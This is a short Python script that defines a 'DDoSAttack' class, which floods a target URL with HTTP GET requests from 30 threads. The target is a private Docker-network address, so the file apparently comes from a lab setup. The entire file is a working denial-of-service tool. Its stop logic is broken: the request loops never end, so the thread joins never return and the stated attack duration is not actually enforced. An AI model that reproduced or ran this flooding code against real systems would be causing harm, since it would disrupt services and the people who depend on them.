import time
import threading
import requests


class DDoSAttack:
    """Class"""
    def __init__(self, target_url, num_threads, attack_duration):
        """
        Initialize the attack parameters.
        
        :param target_url: The URL of the target to attack.
        :param num_threads: Number of threads to simulate concurrent requests.
        :param attack_duration: Duration (in seconds) for how long the attack should last.
        """
        self.target_url = target_url
        self.num_threads = num_threads
        self.attack_duration = attack_duration
        self.threads = []

    def send_request(self):
        """Send requests continuously to the target URL."""
        while True:
            try:
                response = requests.get(url=self.target_url, timeout=0.01)
                print(f"Request sent, status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

    def start_attack(self):
        """Start the DDoS attack by creating multiple threads to send requests."""
        print(f"Starting attack on {self.target_url} with {self.num_threads} threads for {self.attack_duration} seconds...")

        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_request)
            thread.start()
            self.threads.append(thread)

        time.sleep(self.attack_duration)

        self.stop_attack()
        print("Attack finished.")

    def stop_attack(self):
        """Stop all threads after the attack is complete."""
        for thread in self.threads:
            thread.join()


if __name__ == "__main__":
    # Define target URL, number of threads, and attack duration
    TARGET_URL = "http://192.168.100.1:5000/"  # Updated to target the web app's IP in Docker network
    NUM_THREADS = 30
    ATTACK_DURATION = 10  # Attack lasts for 10 seconds

    # Initialize and start the attack
    attack = DDoSAttack(TARGET_URL, NUM_THREADS, ATTACK_DURATION)
    attack.start_attack()
